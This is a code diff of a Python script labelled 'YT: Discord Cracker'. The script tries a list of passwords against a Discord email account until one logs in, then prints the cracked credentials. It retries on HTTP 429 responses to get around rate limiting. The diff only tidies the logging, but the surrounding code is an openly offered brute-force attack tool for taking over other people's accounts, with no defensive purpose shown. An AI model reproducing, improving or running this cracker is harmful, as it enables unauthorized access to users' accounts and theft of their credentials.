@@ -1,21 +1,19 @@
 import requests
-import os
-from colorama import init, Fore
+from colorama import Fore, Style
 from datetime import datetime
-
-init(autoreset=True)
+import os
 
 def log(message, level="INFO"):
     timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
     if level == "INFO":
-        print(f"{timestamp} {Fore.GREEN}[INFO]{Fore.RESET} {message}", end="")
+        print(f"{timestamp} {Fore.GREEN}[INFO]{Fore.RESET} {message}")
     elif level == "WARNING":
-        print(f"{timestamp} {Fore.YELLOW}[WARNING]{Fore.RESET} {message}", end="")
+        print(f"{timestamp} {Fore.YELLOW}[WARNING]{Fore.RESET} {message}")
     elif level == "ERROR":
-        print(f"{timestamp} {Fore.RED}[ERROR]{Fore.RESET} {message}", end="")
+        print(f"{timestamp} {Fore.RED}[ERROR]{Fore.RESET} {message}")
     else:
-        print(message, end="")
-        
+        print(message)
+
 def main():
     log("YT: Discord Cracker")
     log("--------------------")
@@ -39,30 +37,30 @@ def main():
         log("Trying passwords...\n")
 
         for password in passwords:
-            log(f"Testing password: {password}... ", end="")
+            log(f"Testing password: {password}... ", "INFO")
             login_result = test_login(email, password)
 
             if login_result:
                 log("\n\n\nCracked successful!", "INFO")
-                log(f"email: {email}")
-                log(f"password: {password}")
+                log(f"email: {email}", "INFO")
+                log(f"password: {password}", "INFO")
                 break
             else:
-                log("Login failed.", "WARNING")
+                log("Login failed.")
 
         log("\nCracked complete.")
     else:
         password = input("Enter your password: ")
 
         while True:
-            log(f"Trying password: {password}... ", end="")
+            log(f"Trying password: {password}... ", "INFO")
             login_result = test_login(email, password)
 
             if login_result:
                 log("Login successful!", "INFO")
                 break
             else:
-                log("Login failed.", "WARNING")
+                log("Login failed.")
 
 def test_login(email, password):
     try:
@@ -77,7 +75,7 @@ def test_login(email, password):
             log("YT: Too Many Requests Bypass Statuscode 429 successful!", "INFO")
             return test_login(email, password)
         else:
-            log(response.status_code, "WARNING")
+            log(response.status_code, "INFO")
             return False
     except Exception as ex:
         log(f"YT: An error occurred: {str(ex)}", "ERROR")
